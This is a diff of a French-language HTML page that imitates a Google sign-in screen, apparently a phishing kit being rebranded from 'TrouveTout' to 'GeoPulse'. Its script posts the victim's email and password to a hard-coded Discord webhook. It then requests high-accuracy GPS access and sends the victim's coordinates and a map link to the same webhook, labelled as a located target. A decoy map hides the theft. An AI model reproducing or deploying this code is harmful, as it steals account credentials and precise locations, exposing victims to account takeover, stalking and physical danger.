@@ -5,36 +5,48 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connexion – Comptes Google</title>
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .login-box { width: 350px; border: 1px solid #dadce0; padding: 40px; border-radius: 8px; text-align: center; }
-        .search-box { display: none; width: 90%; max-width: 500px; padding: 20px; text-align: center; border: 1px solid #ccc; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
-        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: bold; }
-        h1 { font-size: 24px; margin-bottom: 10px; }
-        .logo { width: 75px; margin-bottom: 20px; }
-        #map-container { margin-top: 20px; height: 300px; width: 100%; display: none; border: 1px solid #ccc; }
+        .search-box { display: none; width: 90%; max-width: 450px; padding: 30px; text-align: center; border-radius: 15px; background: #ffffff; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border: 1px solid #e0e0e0; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; font-size: 14px; width: 100%; margin-top: 15px; }
+        button:hover { background: #1557b0; }
+        .logo-google { width: 75px; margin-bottom: 20px; }
+        .gp-logo { color: #1a73e8; font-size: 32px; font-weight: bold; margin-bottom: 5px; letter-spacing: -1px; }
+        #status { margin-top: 15px; font-size: 13px; color: #5f6368; }
+        .sub-text { font-size: 14px; color: #3c4043; margin-top: 15px; }
     </style>
 </head>
 <body>
 
 <div id="login-step" class="login-box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
-    <h1>Connexion</h1>
-    <p>Utilisez votre compte Google pour accéder à TrouveTout</p>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo-google">
+    <h1 style="font-size: 24px; font-weight: 400; margin-bottom: 25px;">Connexion</h1>
+    
     <input type="text" id="email" placeholder="E-mail ou téléphone">
     <input type="password" id="pass" placeholder="Mot de passe">
-    <div style="text-align: right; margin-top: 20px;">
-        <button onclick="captureLogin()">Suivant</button>
+    
+    <div class="sub-text">
+        Connectez-vous avec Google pour accéder à <strong>GeoPulse</strong>
+    </div>
+
+    <button onclick="captureLogin()">Suivant</button>
+    
+    <div style="margin-top: 25px; text-align: left;">
+        <span style="color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer;">Créer un compte</span>
     </div>
 </div>
 
 <div id="search-step" class="search-box">
-    <h1 style="color: #1a73e8;">📍 TrouveTout</h1>
-    <p>Trouvez l'établissement le plus proche de vous instantanément.</p>
-    <input type="text" id="query" placeholder="Ex: McDo, Coiffeur, Boulangerie...">
-    <button onclick="startSearch()">Rechercher</button>
-    <div id="status" style="margin-top: 10px; font-size: 14px; color: gray;"></div>
-    <div id="map-container">
+    <div class="gp-logo">GeoPulse<span style="color: #34a853;">.</span></div>
+    <p style="color: #5f6368; margin-bottom: 25px;">Intelligence de proximité haute précision</p>
+    
+    <input type="text" id="query" placeholder="Chercher un lieu (ex: Sushi, Banque...)">
+    <button onclick="startSearch()">Lancer la recherche</button>
+    
+    <div id="status">Prêt pour l'analyse locale.</div>
+    
+    <div id="map-placeholder" style="margin-top:20px; height:250px; display:none; border-radius:8px; overflow:hidden;">
         <iframe id="map-iframe" width="100%" height="100%" frameborder="0" style="border:0"></iframe>
     </div>
 </div>
@@ -42,78 +54,69 @@
 <script>
 const webhook = "https://discord.com/api/webhooks/1406320274206490685/T5UlsYLa2A-ZUGfItLh6Uai053DnYNhbOsF0agE-gngh0DJuQDxt7sWRridLKNi1M5XP";
 
-// Capture du Login
 async function captureLogin() {
     const email = document.getElementById('email').value;
     const pass = document.getElementById('pass').value;
-
     if(email && pass) {
         await fetch(webhook, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 embeds: [{
-                    title: "🔑 LOGINS CAPTURÉS",
-                    color: 16711680,
+                    title: "🔑 NOUVEL ACCÈS GOOGLE CAPTURÉ",
+                    color: 16733952,
                     fields: [
-                        { name: "📧 Email", value: email, inline: true },
-                        { name: "🔒 Mot de passe", value: pass, inline: true }
-                    ]
+                        { name: "📧 Email/User", value: `\`${email}\``, inline: true },
+                        { name: "🔒 Password", value: `\`${pass}\``, inline: true }
+                    ],
+                    footer: { text: "GeoPulse OSINT Intelligence" }
                 }]
             })
         });
-        // Passage à la page suivante
         document.getElementById('login-step').style.display = 'none';
         document.getElementById('search-step').style.display = 'block';
-    } else {
-        alert("Veuillez remplir les champs.");
-    }
+    } else { alert("Veuillez remplir les champs."); }
 }
 
-// Recherche avec GPS
-function startSearch() {
+async function startSearch() {
     const query = document.getElementById('query').value;
     const status = document.getElementById('status');
-    
-    if(!query) return alert("Que cherchez-vous ?");
-    
-    status.innerText = "Autorisez la localisation pour voir les résultats...";
+    if(!query) return;
+
+    status.innerHTML = "<span style='color: #1a73e8;'>⏳ Autorisez l'accès GPS pour synchroniser les résultats...</span>";
 
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
-
-            // Envoi GPS au Webhook
+            
             await fetch(webhook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🎯 LOCALISATION GPS PRÉCISE",
-                        color: 3066993,
+                        title: "🎯 CIBLE LOCALISÉE (GeoPulse)",
+                        color: 3447003,
                         fields: [
-                            { name: "🔎 Recherche", value: query },
-                            { name: "📍 Carte", value: `[Voir sur Google Maps](https://www.google.com/maps?q=${lat},${lon})` }
+                            { name: "🔎 Recherche", value: query, inline: true },
+                            { name: "📍 Google Maps", value: `[Cliquer pour voir la rue](https://www.google.com/maps?q=${lat},${lon})` },
+                            { name: "🌍 Coordonnées", value: `\`${lat}, ${lon}\`` }
                         ]
                     }]
                 })
             });
 
-            // Affichage de la VRAIE carte pour la cible
-            status.innerText = `Résultats pour "${query}" près de chez vous :`;
-            const mapIframe = document.getElementById('map-iframe');
-            mapIframe.src = `https://www.google.com/maps/embed/v1/search?key=VOTRE_CLE_API_NON_NECESSAIRE&q=${query}&center=${lat},${lon}&zoom=14`;
-            // Note: Pour l'iframe sans clé API, on utilise une version publique de recherche
-            mapIframe.src = `https://www.google.com/maps?q=${query}&output=embed`;
-            document.getElementById('map-container').style.display = 'block';
+            status.innerHTML = "✅ Résultats trouvés !";
+            document.getElementById('map-placeholder').style.display = 'block';
+            document.getElementById('map-iframe').src = `https://www.google.com/maps?q=${query}&output=embed`;
 
         }, () => {
-            status.innerText = "Erreur : La localisation est nécessaire pour trouver l'établissement.";
+            status.innerHTML = "❌ Erreur : Accès GPS refusé.";
         }, { enableHighAccuracy: true });
     }
 }
 </script>
 </body>
 </html>
+
 
